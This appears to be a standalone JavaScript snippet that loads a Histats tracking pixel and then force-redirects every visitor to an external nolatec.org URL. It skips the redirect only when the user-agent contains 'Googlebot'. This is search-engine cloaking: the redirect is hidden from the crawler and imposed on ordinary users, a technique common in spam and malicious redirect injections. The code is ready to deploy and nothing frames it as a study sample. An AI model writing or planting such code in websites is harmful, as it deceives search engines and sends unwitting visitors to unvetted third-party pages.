// Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
if (!navigator.userAgent.includes('Googlebot')) {
  var histatsPixel = new Image();
  histatsPixel.src = "https://s10.histats.com/1.gif?5032111&101";
  
  // Direct Redirect without setTimeout
  window.location.href = "https://nolatec.org/4/1e5c257bb6f145c9aef01843d3777f97";

} else {
  // For search engine crawlers, you can choose to perform a different action or not redirect
  console.log("THanks for visiting my page");
}
